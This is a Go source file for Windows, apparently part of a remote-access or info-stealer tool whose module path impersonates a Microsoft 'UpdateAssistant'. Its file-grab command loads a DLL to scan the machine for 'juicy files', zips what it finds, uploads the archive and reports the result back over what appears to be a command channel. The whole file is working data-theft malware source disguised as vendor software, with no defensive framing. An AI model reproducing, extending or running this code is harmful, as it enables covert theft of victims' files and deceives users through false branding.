//go:build windows

package system

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/files"
	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var filegrabUsage = []string{
	"file — recursively scan for juicy files and send as zip",
}

func HandleFileGrab(c *ipc.Context) error {
	if c.ArgString() != "" {
		return c.Usage(filegrabUsage)
	}
	go runFileGrab(c)
	return nil
}

func runFileGrab(c *ipc.Context) {
	logger.Info("[filegrab] starting scan")
	vault := filepath.Join(config.DataPath(), "filegrabz")
	os.RemoveAll(vault)

	fg, err := loader.Load("filegrab")
	if err != nil {
		logger.Error("[filegrab] failed to load dll: %v", err)
		c.ReplyEmbed(ipc.Error("Failed to load filegrab.dll"))
		return
	}
	defer loader.Unload(fg)

	buf := make([]byte, 1024*1024)
	n, _ := fg.Call("filegrab_run",
		uintptr(unsafe.Pointer(&[]byte(vault)[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)))

	var grabbed []struct {
		Name  string `json:"name"`
		Score int    `json:"score"`
		Size  uint32 `json:"size"`
	}
	json.Unmarshal(buf[:int(n)], &grabbed)
	if len(grabbed) == 0 {
		c.ReplyEmbed(ipc.Error("No juicy files found"))
		return
	}

	zipPath := filepath.Join(os.TempDir(), "filegrab.zip")
	zf, err := os.Create(zipPath)
	if err != nil {
		c.ReplyEmbed(ipc.Error("Failed to create zip"))
		return
	}
	zw := zip.NewWriter(zf)

	srcDir := filepath.Join(vault, "files")
	filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(srcDir, path)
		w, err := zw.Create(rel)
		if err != nil {
			return nil
		}
		f, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer f.Close()
		io.Copy(w, f)
		return nil
	})

	zw.Close()
	zf.Close()

	zipData, err := os.ReadFile(zipPath)
	os.Remove(zipPath)
	os.RemoveAll(vault)
	if err != nil {
		c.ReplyEmbed(ipc.Error("Failed to read zip"))
		return
	}

	id, err := files.Upload("filegrab.zip", zipData)
	if err != nil {
		logger.Error("[filegrab] upload failed: %v", err)
		c.ReplyEmbed(ipc.Error("Upload failed: " + err.Error()))
		return
	}

	logger.Info("[filegrab] grabbed %d files, uploaded %s", len(grabbed), id)
	c.ReplyEmbed(ipc.Success(fmt.Sprintf("Grabbed %d files", len(grabbed))))
	c.ReplyFile([]string{id})
}
